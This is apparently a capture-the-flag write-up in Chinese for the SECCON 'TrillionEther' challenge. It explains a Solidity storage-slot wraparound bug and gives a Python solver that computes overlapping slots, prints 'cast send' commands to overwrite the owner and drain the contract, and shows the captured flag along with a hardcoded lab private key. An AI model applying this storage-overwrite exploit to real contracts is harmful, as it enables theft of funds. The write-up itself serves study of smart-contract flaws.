# TrillionEther

考點:
- name 可以蓋 wallets 的 length
- slot 超過 2^256 會 loop

這題 dynamic array 的 slot 位置 = (keccak256(0) + index * 3) % 2^256

所以可以簡單算一下目標 slot 位置，假設分別為 slot0, slot1, slot2

以及對應的 input: x, y, z

其中 slot2 為 owner，故 z = owner - 1

而 slot1 = slot2 - 1, slot0 = slot2 - 2，所以可回推 x, y 

分三次蓋，順序為 slot0 -> slot1 -> slot2


```python
owner = 0x2895EFC89a6c7748e9bF585bb2410A174ceEC776 - 1
private = "93dafe735ca60e2118950f1c3080e68cdc3c7997b1160f978702d29f7e3a92d8"
contract = "0x8B01643FE0C3EAadeCd44D6Aa3d90bF453bc49cf"
rpc = "http://trillion-ether.seccon.games:8545/8c3c94b3-34ff-4135-9a60-ec99e894ea10"

h_0 = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d  # keccak256(0)

def cal_slot(x, h_0):
    return (h_0 + x * 3) % (2**256)

slot_2 = cal_slot(owner, h_0)
slot_1 = slot_2 - 1
slot_0 = slot_2 - 2

def find_input(_slot, h_0):
    while _slot < h_0:
        _slot += 2 **256

    if (_slot - h_0) % 3 == 0:
        ans = ((_slot - h_0) // 3)
    else:
        z = ((_slot + 2**256))
        while (z - h_0) % 3 != 0:
            z += 2**256
        print(z - h_0)
        ans = (int((z - h_0)//3))
    return ans

x = find_input(slot_0, h_0)
y = find_input(slot_1, h_0)

# input order: slot_0, slot_1, slot_2
print("slot0: ", x, hex(x))
print("slot1: ", y, hex(y))
print("slot2: ", owner, hex(owner))
print("withdraw id:", x)

# verify
print("x's slot:", cal_slot(x, h_0))
print("y's slot:", cal_slot(y, h_0))
print("z's slot:", cal_slot(owner, h_0))

# ======= cmd ========
print('''cast send {} "createWallet(bytes32)" {} --value 0 --private-key={} --rpc-url={}'''.format(contract, hex(x), private, rpc))
print('''cast send {} "createWallet(bytes32)" {} --value 0 --private-key={} --rpc-url={}'''.format(contract, hex(y), private, rpc))
val = "0x" + "0" * (66 - len(hex(owner))) + hex(owner)[2:]
print('''cast send {} "createWallet(bytes32)" {} --value 0 --private-key={} --rpc-url={}'''.format(contract, val, private, rpc))
val = "0xff" + hex(y)[4:]
print('''cast send {} "createWallet(bytes32)" {} --value 0 --private-key={} --rpc-url={}'''.format(contract, val, private, rpc))
print('''cast send {} "withdraw(uint256,uint256)" {} {} --private-key={} --rpc-url={}'''.format(contract, hex(x), "1000000000000000000000000000000", private, rpc))



'''
$ nc trillion-ether.seccon.games 31337

1 - launch new instance
2 - kill instance
3 - get flag (if isSolved() is true)
action? 3
uuid please: 8c3c94b3-34ff-4135-9a60-ec99e894ea10

Congratulations! You have solved it! Here's the flag:
SECCON{unb3l13-bubb13_64362072f002c1ea}
'''
```
